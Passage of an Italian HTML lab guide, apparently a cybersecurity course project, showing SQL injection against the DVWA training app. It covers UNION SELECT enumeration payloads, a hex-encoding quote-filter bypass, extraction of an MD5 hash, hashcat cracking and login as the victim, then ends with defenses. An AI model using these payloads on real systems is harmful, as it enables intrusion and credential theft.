+  </div>
+
+  <h3>1 · In che database ci troviamo?</h3>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B2 · Step 1</span>
+      <span class="level bonus">BONUS</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Enumera DB corrente">1 UNION SELECT null, database()</pre>
+      <p class="qc-caption">La funzione <code>database()</code> restituisce il nome dello schema in uso. Prima colonna <code>null</code>, seconda colonna riceve il nome.</p>
+    </div>
+  </div>
+
+  <pre data-label="Response — campo First name vuoto, Surname col nome DB">First name: 
+Surname: dvwa</pre>
+
+  <h3>2 · Che versione di MySQL gira dietro le quinte?</h3>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B2 · Step 2</span>
+      <span class="level bonus">BONUS</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Enumera versione motore DB">1 UNION SELECT null, @@version</pre>
+      <p class="qc-caption">La variabile di sistema <code>@@version</code> espone la versione esatta di MySQL. Informazione preziosa per cercare vulnerabilità note (CVE) specifiche per quella build.</p>
+    </div>
+  </div>
+
+  <pre data-label="Response">First name: 
+Surname: 5.0.51a-3ubuntu5</pre>
+
+  <div class="danger-box">
+    <p>Una versione MySQL del 2008 su un sistema in produzione sarebbe già un <strong>finding critico</strong> nel report. Decine di CVE note, nessun supporto da anni.</p>
+  </div>
+
+  <h3>3 · Che tabelle ci sono nel database dvwa?</h3>
+
+  <p>MySQL tiene traccia di <em>sé stesso</em> in un database speciale chiamato <code>information_schema</code>. Dentro c'è una tabella <code>tables</code> che elenca tutte le tabelle di tutti i database. È la mappa del palazzo.</p>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B2 · Step 3</span>
+      <span class="level bonus">BONUS</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Enumera tabelle del DB corrente">1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema = database()</pre>
+      <p class="qc-caption">Chiediamo ad <code>information_schema.tables</code> i nomi delle tabelle, filtrando su quelle del nostro database attuale.</p>
+    </div>
+  </div>
+
+  <pre data-label="Response — elenco tabelle">First name: 
+Surname: guestbook
+First name: 
+Surname: users</pre>
+
+  <p>Scopriamo due tabelle: <code>guestbook</code> e <code>users</code>. La seconda è evidentemente il bersaglio.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_06-A.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <img src="img/Screenshot_06-B.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <img src="img/Screenshot_06-C.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Enumerazione progressiva — DB, versione, tabelle
+	Fig. 6 - Tre screenshot affiancati, uno per ogni step dell'enumerazione
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 9 -->
+<article class="chapter" id="cap9">
+  <div class="chapter-num">Capitolo 09</div>
+  <h2>Il trucco <em>esadecimale</em> per Pablo.</h2>
+
+  <p>Ora un tocco di classe. Immagina che il sito, invece di non filtrare niente, filtri <strong>gli apostrofi</strong>. Se volessimo cercare solo le righe dove il nome è "Pablo", la query naturale sarebbe:</p>
+
+  <pre data-label="❌ Query che verrebbe bloccata da un filtro apici" class="highlight">... WHERE first_name = 'Pablo'</pre>
+
+  <p>Ma quei due apici intorno a "Pablo" sarebbero rimossi o escapati. La query diventerebbe inutile.</p>
+
+  <div class="metaphor">
+    <p>È come se il buttafuori confiscasse tutte le buste chiuse. Per passare un messaggio, non usiamo una busta: scriviamo direttamente sul braccio con un codice che solo chi è dentro capisce.</p>
+  </div>
+
+  <p>Il codice che useremo è <strong>l'esadecimale</strong>. Ogni lettera ha un codice numerico (ASCII) che possiamo scrivere in base 16. MySQL riconosce il prefisso <code>0x</code> come "ecco una stringa codificata": la traduce automaticamente senza bisogno di apici.</p>
+
+  <h3>Convertire "Pablo" in esadecimale</h3>
+
+  <table class="table-query">
+    <thead>
+      <tr><th>Lettera</th><th>ASCII decimale</th><th>ASCII esadecimale</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>P</td><td>80</td><td class="mono">0x50</td></tr>
+      <tr><td>a</td><td>97</td><td class="mono">0x61</td></tr>
+      <tr><td>b</td><td>98</td><td class="mono">0x62</td></tr>
+      <tr><td>l</td><td>108</td><td class="mono">0x6c</td></tr>
+      <tr><td>o</td><td>111</td><td class="mono">0x6f</td></tr>
+    </tbody>
+  </table>
+
+  <p>Concatenati diventano: <strong><code>0x5061626c6f</code></strong>. Una sola parola, senza apici, pronta all'uso. Verifica istantanea dal terminale:</p>
+
+  <pre data-label="Verifica con xxd">$ echo -n "Pablo" | xxd -p
+5061626c6f</pre>
+
+  <div class="bypass-box">
+    <p>Questa tecnica è nota come <strong>hex encoding bypass</strong>. È uno dei bypass più classici quando il filtro dell'applicazione blocca apici, virgolette o specifici caratteri ma lascia passare numeri e lettere.</p>
+  </div>
+
+  <div class="query-card">
+    <div class="qc-header">
+      <span>Payload Bonus B2 — Extra · Filtro Pablo via hex</span>
+      <span class="level bonus">BONUS</span>
+    </div>
+    <div class="qc-body">
+      <pre data-label="Ricerca mirata senza apici">1 UNION SELECT user, password FROM users WHERE first_name = 0x5061626c6f</pre>
+      <p class="qc-caption">Niente apici, solo il literal esadecimale. MySQL lo decodifica in "Pablo" al volo e filtra la riga giusta.</p>
+    </div>
+  </div>
+
+  <pre data-label="Response — solo Pablo">First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>
+
+  <p>Stesso hash degli step precedenti, ma estratto con un'eleganza che bypasserebbe un WAF mal configurato nel mondo reale.</p>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_07.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Query hex encoding — solo Pablo dumpato
+	Fig. 7 - Burp con payload 0x5061626c6f, response con singola riga Pablo
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 10 -->
+<article class="chapter" id="cap10">
+  <div class="chapter-num">Capitolo 10</div>
+  <h2>Cos'è un <em>hash</em>.<br>(E perché non salva nessuno.)</h2>
+
+  <p>Benvenuti nel mondo degli <strong>hash</strong>. Un hash è una specie di "ditale" matematico: prendi una qualunque parola (anche lunghissima) e una formula la trasforma in una stringa di lunghezza fissa, apparentemente casuale.</p>
+
+  <div class="metaphor">
+    <p>È come un tritacarne a senso unico. Metti dentro una bistecca, esce fuori il macinato. Dal macinato non puoi più ricostruire la bistecca originale. In teoria.</p>
+  </div>
+
+  <p>Quando ti iscrivi a un sito e scegli la password <code>letmein</code>, il sito <strong>non dovrebbe</strong> salvare "letmein" com'è scritto. Dovrebbe salvare l'hash, cioè il macinato. Così se qualcuno ruba il database (come abbiamo appena fatto noi), trova solo stringhe illeggibili.</p>
+
+  <p>Ma c'è un problema. Gli hash sono <em>deterministici</em>: la stessa parola produce <em>sempre</em> lo stesso hash. Quindi se io calcolo l'hash di <code>letmein</code>... ottengo <code>0d107d09f5bbe40cade3de5c71e9e9b7</code>. Se lo confronto con l'hash di Pablo... <strong>coincide</strong>. Gotcha.</p>
+
+  <pre data-label="Verifica manuale dal terminale">$ echo -n "letmein" | md5sum
+0d107d09f5bbe40cade3de5c71e9e9b7  -</pre>
+
+  <p>È questo il <strong>secondo step</strong> di cui parla la traccia. Una volta presa la password cifrata, dobbiamo <em>indovinare</em> la parola originale provandone milioni al secondo.</p>
+</article>
+
+<!-- CAPITOLO 11 -->
+<article class="chapter" id="cap11">
+  <div class="chapter-num">Capitolo 11</div>
+  <h2>La password finalmente <em>in chiaro</em>.</h2>
+
+  <p>Per indovinare la parola originale usiamo un programma che si chiama <strong>Hashcat</strong>. È una specie di calcolatrice turbo: prende una lista sterminata di password comuni (<em>rockyou.txt</em>, 14 milioni di password rubate in passato e ormai pubbliche), calcola l'hash di ciascuna, e la confronta con la nostra preda.</p>
+
+  <pre data-label="Il comando magico">$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</pre>
+
+  <div class="story-grid">
+    <div class="num">→</div>
+    <div>
+      <h4>Cosa significa il comando</h4>
+      <p><code>-m 0</code> dice a Hashcat: "l'hash è di tipo MD5". <code>-a 0</code> dice: "prova ogni parola del dizionario, una per una". Il file <code>hash.txt</code> contiene la nostra stringa da crackare.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">⏱</div>
+    <div>
+      <h4>Quanto ci mette</h4>
+      <p>Su un computer qualunque, MD5 si calcola a <strong>miliardi</strong> di tentativi al secondo. La password <em>letmein</em> è tra le prime mille più usate al mondo. Tempo di cracking effettivo: <strong>meno di un secondo</strong>.</p>
+    </div>
+  </div>
+
+  <div class="story-grid">
+    <div class="num">🎯</div>
+    <div>
+      <h4>Il risultato</h4>
+      <p>Hashcat stampa la riga magica:</p>
+      <pre data-label="Cracked!" style="margin-top:8px;">0d107d09f5bbe40cade3de5c71e9e9b7:letmein</pre>
+      <p>Abbiamo la password di Pablo Picasso in chiaro: <strong>letmein</strong>. Ora possiamo loggarci nell'applicazione al posto suo.</p>
+    </div>
+  </div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_08.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Output finale di Hashcat <br>
+	Fig. 8 - Terminale con riga "Status: Cracked" e la password evidenziata
+  </p>
+</div>
+
+<div class="screenshot-container" style="margin: 32px 0; text-align: center;">
+  <img src="img/Screenshot_09.png" alt="Pagina SQLi DVWA" style="max-width: 100%; border: 1px solid #2a2e3a; border-radius: 4px;">
+  <p style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #4a4d57; margin-top: 8px;">
+    Login in DVWA come <code> pablo / letmein </code> <br>
+	Fig. 9 - Prova finale: siamo dentro col suo account
+  </p>
+</div>
+</article>
+
+<!-- CAPITOLO 12 -->
+<article class="chapter" id="cap12">
+  <div class="chapter-num">Capitolo 12</div>
+  <h2>Come difendersi. <em>Davvero.</em></h2>
+
+  <p>Tutto questo è successo perché l'applicazione aveva due errori gravi ma, purtroppo, molto comuni. Ecco cosa si sarebbe dovuto fare.</p>
+
+  <h3>1. Mai incollare l'input dell'utente nelle query</h3>
+  <p>La regola d'oro si chiama <strong>prepared statements</strong> (o "query parametriche"). Invece di comporre la frase SQL incollando pezzi di testo, si prepara uno <em>schema</em> con spazi vuoti e si passano i dati separatamente. Il database sa distinguere cos'è comando e cos'è dato, e non confonde mai i due.</p>
+
+  <pre data-label="✅ Codice sicuro (PHP esempio)">$stmt = $db->prepare("SELECT first_name FROM users WHERE user_id = ?");
+$stmt->bind_param("i", $user_id);
+$stmt->execute();</pre>
+
+  <h3>2. Salare gli hash delle password</h3>
+  <p>MD5 senza sale è trasparente come il vetro. Le password vanno protette con algoritmi moderni come <strong>bcrypt</strong>, <strong>argon2</strong> o <strong>scrypt</strong>, che aggiungono un valore casuale (<em>sale</em>) e rallentano il calcolo apposta per rendere il cracking impraticabile.</p>
+
+  <h3>3. Principio del privilegio minimo</h3>
+  <p>Il nostro attacco è stato devastante anche perché il sito parlava col database usando l'utente <code>root</code> — che può leggere e scrivere tutto. Un sito ben configurato usa un utente con permessi ristretti: solo le tabelle che gli servono, solo in lettura dove possibile.</p>
+
+  <h3>4. Validare l'input, non sanitizzarlo tardi</h3>
+  <p>Il livello Medium di DVWA dimostra un errore tipico: sanitizzare solo gli apici e dimenticare che l'input numerico non ne ha bisogno. La validazione va fatta <strong>sul tipo atteso</strong>: se l'id è un numero, si converte a intero prima dell'uso. Punto.</p>
+
+  <h3>5. Web Application Firewall (WAF)</h3>
+  <p>Un WAF moderno riconosce i pattern tipici di SQLi (<code>UNION SELECT</code>, <code>OR 1=1</code>, ecc.) e blocca la richiesta prima che arrivi all'applicazione. Non è una soluzione definitiva — si può aggirare con tecniche come l'hex encoding che abbiamo visto — ma è un ottimo livello di difesa aggiuntivo.</p>
+
+  <div class="tip-box">
+    <p>Morale: la sicurezza non è un singolo lucchetto. È una serie di porte, ognuna un po' più dura da aprire della precedente. Quando una cade, le altre reggono.</p>
+  </div>
+</article>
+
+<!-- FINALE -->
+<section class="finale">
+  <h2>Fine del<br><em>giro completo</em>.</h2>
+  <p>Hai appena seguito, dall'inizio alla fine, uno degli attacchi web più famosi della storia di Internet. La SQL Injection è nella OWASP Top 10 dal 2003 e ancora oggi fa danni reali, ogni giorno, in produzione.</p>
+  <p>Conoscere il meccanismo non ti rende un criminale. Ti rende un <strong>architetto più attento</strong>. Ogni volta che scriverai codice che tocca un database, ricorderai cosa può succedere quando non ti fidi abbastanza dei tuoi input.</p>
+</section>
+
+<footer>
+  <span>Guida illustrata v2.0 · Task 01 · Build Week Cybersecurity</span>
+  <span class="classified">CONFIDENTIAL · Solo uso didattico in ambienti autorizzati</span>
+  <span>Team - DIGITAL AVENGERS</span>
+</footer>
+
+</body>
+</html>
